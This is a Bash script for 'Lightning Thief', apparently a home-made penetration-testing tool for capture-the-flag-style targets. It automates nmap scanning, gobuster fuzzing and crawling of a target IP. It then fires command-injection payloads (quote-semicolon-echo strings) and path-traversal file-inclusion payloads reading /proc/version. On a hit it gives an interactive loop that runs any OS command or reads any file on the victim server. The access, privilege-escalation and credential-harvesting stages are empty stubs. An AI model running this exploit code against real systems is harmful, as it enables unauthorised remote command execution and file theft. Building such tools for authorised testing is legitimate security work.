#!/bin/bash
declare -A port_service_dict
declare -A port_version_dict
declare -A http_service_dict
declare -A site_map_dict

#set -x

menu() {
    echo "Current Settings:"
    echo " "
    echo "Target IP:" "$targetIP"
    echo "Local IP:" "$localIP"
    echo "Listen on Port:" "$localPort"
    echo "Scan Port(s):" "$scanPorts"
    echo "HTTP/S Port(s):" "$httpPorts"
    echo "Enumeration WordList:" "$discoveryPath"
    echo "Password Wordlist:" "$crackPassPath" 
    echo " "
    echo "Pen Test Stages"
    echo " "
    echo "[0] Change Settings"
    echo "[1] Domain Intelligence (Local)"
    echo "[2] Network Scanning (Local)" 
    echo "[3] Site Scanning (Local)"
    echo "[4] Idenitfy Vulnerabilities (Local)"
    echo "[5] Exploit Vulnerabilities (Local)"
    echo "[6] Maintain Access (Local/Target)" 
    echo "[7] Escalate Privilages (Target)"
    echo "[8] Harvest Credentials (Target)"
    echo "[9] Crack Passwords (Local/Target)"
    echo " "
    read -p "Select Stage: " stage
    getTools
    navigator
}

navigator() {
    case "$stage" in
        0)
            stage0
            ;;
        1)
            stage1
            ;;
        2)
            stage2
            prompt_next_stage "stage3"
            ;;
        3)
            stage3
            prompt_next_stage "stage4"
            ;;
        4)
            stage4
            prompt_next_stage "stage5"
            ;;
        5)
            stage5
            prompt_next_stage "stage6"
            ;;
        6)
            stage6
            prompt_next_stage "stage7"
            ;;
        7)
            stage7
            prompt_next_stage "stage8"
            ;;
        8)
            stage8
            prompt_next_stage "stage9"
            ;;
        9)
            stage9
            prompt_next_stage
            ;;
        *)
            echo "Invalid stage: $stage"
            ;;
    esac
}

settings() {
    echo "-- Options --"
    echo " "
    echo "*********************************************"
    echo " "
    echo "Scan Port(s) "
    echo " "
    echo "<port> = Scan a Single Port"
    echo "<port>,<port> = Scan a List of Ports"
    echo "<port>-<port> = Scan Port Range"
    echo "<port>,<port>,<port>-<port> =  Scan a Combination of Ports and Port Ranges"
    echo " "
    echo "TOP = Scans Top 1,000 TCP Ports"
    echo "ALL = Scans All 65,5335 TCP Ports"
    echo " "
    echo "*********************************************"
    echo " "
    echo "HTTP/S Port(s) "
    echo " "
    echo "# Web Hacking will only be attempted on ports running HTTP service"
    echo "# You can include non http service ports in your port ranges as they will be filtered out and ignored"
    echo " "
    echo "<port> = Attempt Web Hacking on Specified HTTP Service Port"
    echo "<port>,<port> = Attempt Web Hacking on List of Ports"
    echo "<port>-<port> = Attempt Web Hacking on Range of Ports"
    echo "<port>,<port>,<port>-<port> = Attempt Web Hacking on Combination of Ports and Port Ranges"
    echo " "
    echo "LATER = Set HTTP Service Ports after Network Scan Results in Stage 3"
    echo "ALL = Attempt Web Hacking on All HTTP Service Ports"
    echo " "
    echo "*********************************************"
    echo " "
    echo "Set Parameters (Press Enter to Skip and Use Default)"
    echo " "

    read -p "Target IP: " temp_targetIP
    if [[ -z "$targetIP" ]]; then
        while [[ -z "$temp_targetIP" ]]; do
            echo "Target cannot be blank"
            read -p "Target IP: " temp_targetIP
        done
    fi
    read -p "Local IP: " temp_localIP
    read -p "Listener Port: " temp_localPort
    read -p "Scan Port(s): " temp_scanPorts
    read -p "HTTP/S Port(s): " temp_httpPorts
    read -p "Enumeration WordList (Full-Path): " temp_discoveryPath
    read -p "Password WordList (Full-Path): " temp_crackPassPath

    # Assign values only if not empty
    [[ -n "$temp_targetIP" ]] && targetIP="$temp_targetIP"
    [[ -n "$temp_localIP" ]] && localIP="$temp_localIP"
    [[ -n "$temp_localPort" ]] && localPort="$temp_localPort"
    [[ -n "$temp_scanPorts" ]] && scanPorts="$temp_scanPorts"
    [[ -n "$temp_httpPorts" ]] && httpPorts="$temp_httpPorts"
    [[ -n "$temp_discoveryPath" ]] && discoveryPath="$temp_discoveryPath"
    [[ -n "$temp_crackPassPath" ]] && crackPassPath="$temp_crackPassPath"

    # Update the .env file
    setEnv "TARGET_IP" "$targetIP"
    setEnv "LOCAL_IP" "$localIP"
    setEnv "LOCAL_PORT" "$localPort"
    setEnv "SCAN_PORTS" "$scanPorts"
    setEnv "HTTP_PORTS" "$httpPorts"
    setEnv "ENUM_LIST" "$discoveryPath"
    setEnv "WORD_LIST" "$crackPassPath"

    echo " "
    clear
    menu
}

loadEnv() {
    # Load the .env file
    if [[ -f .env ]]; then
        source .env
    else
        echo ".env file not found!"
        exit 1
    fi

    # Assign default values if not set
    targetIP="${TARGET_IP:-""}"
    localIP="${LOCAL_IP:-$(ip route get 1.1.1.1 | awk '{print $7; exit}')}"
    localPort="${LOCAL_PORT:-7654}"
    scanPorts="${SCAN_PORTS:-TOP}"
    httpPorts="${HTTP_PORTS:-80}"
    discoveryPath="${ENUM_LIST:-/usr/share/seclists/Discovery/Web-Content/common.txt}"
    crackPassPath="${WORD_LIST:-/usr/share/wordlists/rockyou.txt}"
}

setEnv()
{
    local key="$1"
    local value="$2"
    local env_file=".env"
    sed -i "/^${key}=/d" "$env_file"
    echo "${key}=\"$value\"" >> "$env_file"
}

resetEnv()
{
    setEnv "TARGET_IP" ""
    setEnv "LOCAL_IP" ""
    setEnv "LOCAL_PORT" ""
    setEnv "SCAN_PORTS" ""
    setEnv "HTTP_PORTS" ""
    setEnv "ENUM_LIST" ""
    setEnv "WORD_LIST" ""

}

stage0() {
    settings
}

stage1() { # Intelligence Gathering
    echo "hello"
}

stage2() { # Network Scanning
    nmapOpen
    nmapVersions
}

stage3() { # Site Scanning
    enumerateSite
    exploreSite
}

stage4() { # Idenitfy Vulnerabilities
    webAttack
}

stage5() {
    echo "hello"
}

stage6() {
    echo "hello"
}

stage7() {
    echo "hello"
}

stage8() {
    echo "hello"
}

prompt_next_stage() {
    local next_stage="$1"
    echo " "
    echo "Continue to next stage, go back to menu, print summary or exit"
    read -p "(next/menu/summary/exit): " choice
    echo " "
    case "$choice" in
        "next")
            $next_stage
            ;;
        "menu")
            menu
            ;;
        "summary")
            echo "place holder"
            ;;
        "exit")
            exit
            ;;
        *)
            echo "Not a valid option, Try again"
            prompt_next_stage
            ;;
    esac
}

getTools() {

    if test "$stage" = "1" || test "$stage" = "2"; then

        if ! command -v python3 >/dev/null 2>&1; then
            echo "Installing Dependencies.."
            sudo apt install -y python3
        fi
    fi
    if test "$stage" = "3"; then
        if ! command -v nmap >/dev/null 2>&1; then
            echo "Installing Dependencies.."
            sudo apt install -y nmap
        fi
        if ! command -v gobuster >/dev/null 2>&1; then
            echo "Installing Dependencies.."
            sudo apt install -y gobuster
        fi
    fi
    echo " "
}

nmapOpen() {
    echo "Identifying Open Ports..."
    echo " "
    if [[ "$scanPorts" == "ALL" ]]; then
        output=$(nmap "$targetIP" -p- --open)
    elif [[ "$scanPorts" == "TOP" ]]; then
        output=$(nmap "$targetIP" --open)
    else
        output=$(nmap "$targetIP" -p "$scanPorts" --open)
    fi

    # Extract open ports and build a comma-separated list
    ports=$(echo "$output" | awk '/^[0-9]+\/[a-z]+/ {print $1}' | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
}

nmapVersions() {
    # Ensure `nmapOpen` was called to populate the ports variable
    if [[ -z "$ports" ]]; then
        echo "No Open Ports We're found"
        return 1
    else

        output=$(nmap "$targetIP" -sV -p "$ports")

        # Populate dictionaries
        while IFS= read -r line; do
            if [[ "$line" =~ ^([0-9]+)/[a-z]+[[:space:]]+open[[:space:]]+([a-zA-Z0-9-]+)[[:space:]]+(.+) ]]; then
                port="${BASH_REMATCH[1]}"
                service="${BASH_REMATCH[2]}"
                version="${BASH_REMATCH[3]}"
                port_service_dict["$port"]="$service"
                port_version_dict["$port"]="$version"
            elif [[ "$line" =~ ^([0-9]+)/[a-z]+[[:space:]]+open[[:space:]]+([a-zA-Z0-9-]+) ]]; then
                # Handle cases where version information is missing
                port="${BASH_REMATCH[1]}"
                service="${BASH_REMATCH[2]}"
                port_service_dict["$port"]="$service"
                port_version_dict["$port"]="unknown"
            fi
        done <<< "$output"

        # Print the header
        printf "%-10s | %-15s | %-50s\n" "Port" "Service" "Version"
        printf "%-10s-+-%-15s-+-%-50s\n" "----------" "---------------" "--------------------------------------------------"

        # Print the dictionaries
        local portCount=0
        local idCount=0
        for key in $(printf "%s\n" "${!port_service_dict[@]}" | sort -n); do
            ((portCount++))
            if [[ "${port_service_dict[$key]}" != "unknown" && "${port_version_dict[$key]}" != "unknown" ]]; then
                printf "%-10s | %-15s | %-50s\n" "$key" "${port_service_dict[$key]}" "${port_version_dict[$key]}"
                ((idCount++))
                if [[ "${port_service_dict[$key]}" == "http" ]]; then
                    http_service_dict["$key"]="${port_service_dict[$key]}"
                fi
            else
            {
                unset ${port_service_dict[$key]}
                unset ${port_version_dict[$key]}
            }
            fi
        done

        if ((portCount > 0)); then
        percentage=$(awk "BEGIN {printf \"%.2f\", ($idCount/$portCount)*100}")
        else
            percentage=0
        fi

        echo " "
        echo "Open Ports: $portCount"
        echo "Identified Ports: $idCount"
        echo "$percentage%" 
        echo " "
        echo "Getting HTTP Services..."
        echo " "
        # Print the header
        printf "%-10s | %-15s | %-50s\n" "Port" "Service" "Version"
        printf "%-10s-+-%-15s-+-%-50s\n" "----------" "---------------" "--------------------------------------------------"

        for key in $(printf "%s\n" "${!http_service_dict[@]}" | sort -n); do
            printf "%-10s | %-15s | %-50s\n" "$key" "${port_service_dict[$key]}" "${port_version_dict[$key]}"
        done
        
        echo " "
    fi
        
}

getPortList() {
    # Input string with port numbers and ranges
    local port_input=$1

    # Reference the array passed as the second argument
    local -n cleanPorts=$2

    # Initialize the array
    cleanPorts=()

    # Split the input string by commas
    IFS=',' read -r -a port_parts <<< "$port_input"

    # Process each part (individual port or range)
    for part in "${port_parts[@]}"; do
        if [[ "$part" == *"-"* ]]; then
            # If the part contains a dash, it's a range
            IFS='-' read -r start end <<< "$part"
            for ((port=start; port<=end; port++)); do
                cleanPorts+=("$port")
            done
        else
            # Otherwise, it's a single port
            cleanPorts+=("$part")
        fi
    done
}


enumerateSite()
{
    cleanHTTP=()

    if [[ ${#http_service_dict[@]} -eq 0 ]]; then # if the user skipped stage 2 treat all ports as valid
        if [[ "$httpPorts" == "LATER" || "$httpPorts" == "ALL" ]]; then
            echo "No Network Scan detected (stage 2)"
            echo " "
            read -p "Select HTTP/S Port(s): " httpPorts
            echo " "
        fi
    fi

    if [[ "$httpPorts" == "LATER" ]]; then
        read -p "Select HTTP/S Port(s): " httpPorts
        echo " "
    fi

    getPortList "$httpPorts" cleanHTTP
    echo "Starting Site Fuzzing.."

   if [[ "$httpPorts" == "ALL" ]]; then
        for key in "${cleanHTTP[@]}"; do
            paths="/"
            testCurl=$(curlCall -s -o /dev/null -w "%{http_code}" "$targetIP:$port/.awdad") # Check the HTTP response code
            if [[ $testCurl -ne 404 ]]; then
                echo $testCurl
                echo "All URLs are accessible, which means none truly are on port $targetIP:$port"
                continue
            fi
            output=$(gobuster -np -q -u "http://$targetIP:$key" -w "$discoveryPath")
            paths+=($(echo "$output" | awk '/\(Status: [0-9]{3}\)/ {gsub(/\(Status: [0-9]{3}\)/, "", $1); print $1}'))
            if [[ ${#paths[@]} -gt 1 ]]; then
                echo " "
                echo "Fuzzing Site: $targetIP:$key"
                echo " "
                printf "%s\n" "${paths[@]}"
                echo " "
                site_map_dict[$key]="${paths[@]}"
            else
                echo " "
                echo "No paths accessible on $targetIP:$key"
                echo " "
            fi
        done
    else
        # Process HTTP/S ports from cleanHTTP directly
        echo " "
        echo "Ports selected: ${cleanHTTP[*]}"
        echo " "
        httpPorts=$(IFS=,; echo "${cleanHTTP[*]}")  # Rebuild as a comma-separated string
        setEnv "HTTP_PORTS" "$httpPorts"

        # Perform curl for each port
        for port in "${cleanHTTP[@]}"; do
            paths="/"
            testCurl=$(curlCall -s -o /dev/null -w "%{http_code}" "$targetIP:$port/.awdad") # Check the HTTP response code
            if [[ $testCurl -ne 404 ]]; then
                echo $testCurl
                echo "All URLs are accessible, which means none truly are on port $targetIP:$port"
                continue
            fi
            output=$(gobuster -np -q -u "http://$targetIP:$port" -w "$discoveryPath")
            paths+=($(echo "$output" | awk '/\(Status: [0-9]{3}\)/ {gsub(/\(Status: [0-9]{3}\)/, "", $1); print $1}'))
            if [[ ${#paths[@]} -gt 1 ]]; then
                echo " "
                echo "Fuzzing Site: $targetIP:$port"
                echo " "
                printf "%s\n" "${paths[@]}"
                echo " "
                site_map_dict[$port]="${paths[@]}"
            else
                echo " "
                echo "No paths accessible on port $targetIP:$port"
                echo " "
            fi
        done
    fi
    
}

exploreSite()
{
    for key in "${!site_map_dict[@]}"; do # Loops through each http port's site pages
        echo " "
        echo "Web Crawling Site: $targetIP:$key"
        echo " "
        pages=(${site_map_dict[$key]})
        i=0
        while [[ $i -lt ${#pages[@]} ]]; do # Crawls all avaliable pages
            page="${pages[$i]}"
            #echo "Checking Page: $page"
            output=$(curlCall -s -L "$targetIP:$key$page")
            hrefs=($(echo "$output" | sed -n 's/.*\(href\|src\|action\)="\(\([\/?]\|\.\/\)[^"]*\)".*/\2/p')) #sed -n 's/.*href="\([^"]*\)".*/\1/p'))
            # add support for scripts later

            for new_page in "${hrefs[@]}"; do
                top_level="/$(echo "$new_page" | cut -d'/' -f2)"
                #[[ $new_page == .* ]] && new_page="${new_page:1}"
                if [[ "$new_page" != /* && "$new_page" != .* && "new_page" != ?* && "$new_page" != "#" ]]; then
                    #echo "before: $new_page"
                    new_page="$page/$new_page"
                    #echo "after: $new_page"
                elif [[ "$new_page" == .* || "$new_page" == "#" ]]; then
                    new_page="${new_page:1}"
                    #continue
                fi
                #echo "Top: $top_level"
                #echo "Checking list for $new_page"
                #echo "Test Page: $new_page"
                if [[ ! " ${pages[@]} " =~ " $new_page " && ! "$new_page" =~ \.css$ && ! "$new_page" =~ \.js$ && ! "$new_page" =~ \.png$ && ! "$new_page" =~ \.jpg$ ]]; then
                    #echo "$new_page"
                    pages+=("$new_page")
                fi
                #echo "Test Top Page: $top_level"
                if [[ ! " ${pages[@]} " =~ "${top_level}" && ! "$new_page" =~ \.css$ && ! "$new_page" =~ \.js$ && ! "$new_page" =~ \.png$ && ! "$new_page" =~ \.jpg$ ]]; then
                    #echo $top_level
                    pages+=("${top_level}")
                fi
            done
            ((i++))
        done
        if [[ ${#pages[@]} -gt 1 ]]; then
            site_map_dict[$key]="${pages[@]}"
            echo " "
            echo "Site Map: $targetIP:$key"
            echo " "
            for site_pages in ${site_map_dict[$key]}; do
                printf "%s\n" "$site_pages"
            done
            echo " "
        fi
    done

}

webAttack() {

    if [[ ${#site_map_dict[@]} -eq 0 ]]; then # if user skipped stage 3
        cleanHTTP=()
        getPortList "$httpPorts" cleanHTTP
        for key in "${cleanHTTP[@]}"; do
            response=$(curlCall -s "$targetIP:$key")
            if [[ -n "$response" ]]; then
                site_map_dict[$key]="/"
            fi
        done
        exploreSite
    fi

    echo "Searching Site for Vulnerabilities..."
    echo " "
    
    for port in "${!site_map_dict[@]}"; do
        for url in ${site_map_dict[$port]}; do
            response=$(curlCall -s "$targetIP:$port$url")
            if [[ -n "$response" ]]; then
                vuln="False"
                searchFlag=$(echo "$response" | grep -oE '{[^}]*\}')
                siteForms=$(echo "$response" | sed -n '/<form/,/<\/form>/p')
                if [[ -n "$searchFlag" ]]; then
                    echo "Potential Flag Found: $url - $searchFlag"
                fi
                if [[ -n "$siteForms" ]]; then 
                    #echo "Form Found: $url "
                    siteGETs=$(echo "$siteForms" | sed -n "s/.*name='\([^']*\)'.*/\1/p")
                    if [[ -n "$siteGETs" && "$url" != *"="* ]]; then
                        url=$(echo "$url?$siteGETs=holder")
                    fi
                fi
                
                if [[ "$url" == *"="* && $vuln != "True" ]]; then

                    checkVulns "CI"
                    [[ "$vuln" == "True" ]] && break
                    checkVulns "LFI"
                    [[ "$vuln" == "True" ]] && break


                fi
            fi
        done
    done
}

lfi()
{
    #set -x
    root=$(echo "$1" | cut -d'=' -f1)
    searchFile="/proc/version"
    searchWord="version"
    lfi_injections=(
    "$searchFile"
    "../../../../../..$searchFile")

    for injection in "${lfi_injections[@]}"; do
        encoded_injection=$(urlencode "$injection")
        output=$(curlCall -s "${root}=${encoded_injection}")
        if [[ -n "$output" ]]; then
            check=$(echo "$output" | grep "$searchWord" | grep -v "proc")
            if [[ -n "$check" ]]; then
                # Return "True" and the payload
                echo "True ${root}=${injection}"
                break
            fi
        fi
    done
}


ci() {
    #set -x # Debug
    root=$(echo "$1" | cut -d'=' -f1)
    searchWord="The Lightning Thief Strikes Again"
    ci_injections=(
    "echo \"$searchWord\"" 
    "\";echo \"$searchWord\"\""
    "';echo \"$searchWord\"'")
    # Define the injection string
    #injection="\";echo \"$searchWord\"\""
    for injection in "${ci_injections[@]}"; do
        encoded_injection=$(urlencode "$injection")

        # Make the curl request
        output=$(curlCall -s "${root}=${encoded_injection}")

        # Check if the output contains the search word
        if [[ -n "$output" ]]; then
            check=$(echo "$output" | grep "$searchWord" | grep -v "echo")
            if [[ -n "$check" ]]; then
                # Return "True" and the payload
                echo "True ${root}=${injection}"
                break
            fi
        fi
    done
}

checkVulns()
{
    if [[ "$1" = "CI" ]]; then
        echo "Trying Command Injection (CI) on $url"
        # Command Injections (CI)
        vuln_output=$(ci "$targetIP:$port$url")
    elif [[ "$1" = "LFI" ]]; then
        vuln_output=$(lfi "$targetIP:$port$url")
        echo "Trying Local File Inclusion (LFI) on $url"
    fi
    
    vuln_boolean=$(echo "$vuln_output" | awk '{print $1}')
    payload=$(echo "$vuln_output" | cut -d' ' -f2-)

    if [[ "$vuln_boolean" = "True" ]]; then
        echo " "
        echo "$targetIP:$port is vulnerable to $1 on page $url"
        vuln="True"
        createPayload "$payload" "$1"
    fi
}

createPayload()
{
    echo " "
    echo "Payload: $1"
    echo " "
    read -p "Would you like to attempt an exploit at this time? (y/n): " payload_response
    echo " "
    if [[ "$payload_response" = "y" ]]; then
        if [[ "$2" = "CI" ]]; then
            echo "Starting CI Injection - Input should be an OS Command"
            temp_command=$(urlencode 'echo [YOUR_INPUT_APPEARS_HERE]')
            temp_payload=$(echo "$1" | sed "s/echo \"The Lightning Thief Strikes Again\"/$temp_command/")
            temp_output=$(curlCall -s "$temp_payload" | sed 's/<[^>]*>//g' | sed 's/^[[:space:]]*//' | sed '/^[[:space:]]*$/N;/^\n$/D')
        elif [[ "$2" = "LFI" ]]; then
            echo "Starting LFI Injection - Input should be a File Path"
            temp_command=$(echo "$1")
            temp_payload=$(echo "$temp_command")
            temp_output=$(curlCall -s "$temp_payload" | sed 's/<[^>]*>//g' | sed 's/^[[:space:]]*//' | sed '/^[[:space:]]*$/N;/^\n$/D')
        fi

        echo " "
        echo "$temp_output"
        echo " "

        while true; do
            read -p "Input Injection (type 'quit' to exit): " payload_command
            if [[ $payload_command = "quit" ]]; then
                break
            else
                if [[ "$2" = "CI" ]]; then
                    new_command=$(urlencode "$payload_command | xargs")
                    new_payload=$(echo "$1" | sed "s/echo \"The Lightning Thief Strikes Again\"/$new_command/")
                    exploit_output=$(curlCall -s "$new_payload" | sed 's/<[^>]*>//g' | sed 's/^[[:space:]]*//' | sed '/^[[:space:]]*$/N;/^\n$/D')
                elif [[ "$2" = "LFI" ]]; then
                    new_command=$(urlencode "$payload_command")
                    new_payload=$(echo "$1" | sed "s|/proc/version|$new_command|")
                    exploit_output=$(curlCall -s "$new_payload" | sed 's/<[^>]*>//g' | sed 's/^[[:space:]]*//' | sed '/^[[:space:]]*$/N;/^\n$/D')
                fi
                echo "$exploit_output"
                echo " "
            fi
        done
    fi
    # TODO: Store payloads for later exploiting

}

urlencode() {
    local input="$1"
    local encoded=""
    local i
    for ((i=0; i<${#input}; i++)); do
        c="${input:i:1}"
        case "$c" in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;  # Keep unreserved characters as is
            *) encoded+=$(printf '%%%02X' "'$c") ;;  # Encode everything else
        esac
    done
    echo "$encoded"
}

curlCall()
{
    max_retries=5
    retry_count=0

    while [[ $retry_count -lt $max_retries ]]; do
        local response=$(curl --max-time 5 "$@")
        if [[ $? -ne 0 ]]; then
            sleep 2
            ((retry_count++))
        else
            echo "$response"
            break
        fi
    done
    if [[ $retry_count -eq $max_retries ]]; then
    echo "Failed to get a successful response after $max_retries retries."
    fi

}

echo " "
echo "Lightning Thief"
echo " "
echo "Updating Packages.."
#sudo apt update -y
echo " "
echo "Loading Configuration.."
echo " "
loadEnv
#sudo apt upgrade
menu